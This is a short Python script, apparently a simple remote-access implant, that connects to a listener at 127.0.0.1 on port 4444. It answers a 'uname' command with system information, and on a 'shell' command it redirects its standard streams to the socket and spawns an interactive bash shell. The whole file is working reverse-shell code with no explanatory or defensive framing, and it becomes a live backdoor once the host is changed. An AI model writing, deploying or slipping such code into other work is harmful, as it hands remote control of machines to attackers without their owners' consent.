#!/usr/bin/python3

import os
import threading
import multiprocessing
import socket
import pty

def connect():

    host = "127.0.0.1"
    port = 4444
    s = socket.create_connection((host,port))
    while True:
        data = s.recv(1024)
        if data.decode() == "uname":
            info = os.uname()
            s.send(str(info).encode())
        if data.decode() == "shell\n":
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn("/bin/bash")

connect()
